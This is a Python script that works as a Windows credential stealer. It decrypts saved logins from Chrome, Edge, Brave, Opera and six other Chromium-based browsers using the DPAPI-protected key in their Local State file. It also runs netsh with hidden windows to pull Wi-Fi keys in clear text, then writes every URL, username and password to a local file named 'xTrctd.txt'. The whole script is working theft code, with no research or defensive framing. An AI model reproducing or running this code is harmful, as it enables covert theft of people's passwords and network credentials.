import os
import json
import base64
import sqlite3
import shutil
import subprocess
import re
from Crypto.Cipher import AES
import win32crypt

def get_encryption_key(browser_profile_path):
    local_state_path = os.path.join(browser_profile_path, '..', 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except (FileNotFoundError, KeyError, json.JSONDecodeError):
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception:
        return ""

def get_browser_passwords(browser_name, browser_profile_path):
    login_db_path = os.path.join(browser_profile_path, 'Login Data')
    if not os.path.exists(login_db_path):
        return []

    temp_db_path = os.path.join(os.environ['TEMP'], 'Login Data')
    shutil.copy2(login_db_path, temp_db_path)

    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        passwords = []
        key = get_encryption_key(browser_profile_path)
        for origin_url, username, encrypted_password in cursor.fetchall():
            if key:
                decrypted_password = decrypt_password(encrypted_password, key)
                if decrypted_password:
                    passwords.append((origin_url, username, decrypted_password))
        conn.close()
        return passwords
    except sqlite3.OperationalError:
        return []
    finally:
        os.remove(temp_db_path)

def get_wifi_passwords():
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    try:
        wifi_data = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode('utf-8').split('\n')
    except subprocess.CalledProcessError:
        return []

    wifi_names = [line.split(':')[1][1:-1] for line in wifi_data if "All User Profile" in line]
    wifi_passwords = []

    for name in wifi_names:
        try:
            wifi_details = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            ).decode('utf-8').split('\n')
            password_lines = [line for line in wifi_details if "Key Content" in line]
            if password_lines:
                password = password_lines[0].split(':')[1][1:-1]
                wifi_passwords.append((name, password))
            else:
                wifi_passwords.append((name, ""))
        except (subprocess.CalledProcessError, IndexError):
            wifi_passwords.append((name, "Error: Could not retrieve password"))

    return wifi_passwords

def main():
    browsers = {
        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default'),
        'Arc': os.path.join(os.environ['APPDATA'], '..', 'Local', 'Programs','Arc','User Data', 'Default'),
        'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Brave': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(os.environ['LOCALAPPDATA'], 'Vivaldi', 'User Data', 'Default'),
        'Chrome Canary': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome SxS', 'User Data', 'Default'),
        'Chromium': os.path.join(os.environ['LOCALAPPDATA'], 'Chromium', 'User Data', 'Default'),
        'Epic Privacy Browser': os.path.join(os.environ['LOCALAPPDATA'], 'Epic Privacy Browser', 'User Data', 'Default'),
        'Coc Coc': os.path.join(os.environ['LOCALAPPDATA'], 'CocCoc', 'Browser', 'User Data', 'Default')
    }

    # Remove browsers that don't exist
    browsers = {k: v for k, v in browsers.items() if os.path.exists(v)}

    with open('xTrctd.txt', 'w', encoding='utf-8') as f:
        for browser_name, browser_profile_path in browsers.items():
            passwords = get_browser_passwords(browser_name, browser_profile_path)
            if passwords:
                f.write(f"\n--- {browser_name} ---\n")
                for url, username, password in passwords:
                    f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")

        wifi_passwords = get_wifi_passwords()
        if wifi_passwords:
            f.write("\n--- Wi-Fi Passwords ---\n")
            for name, password in wifi_passwords:
                f.write(f"Wi-Fi Name: {name}\nPassword: {password}\n\n")

if __name__ == '__main__':
    main()
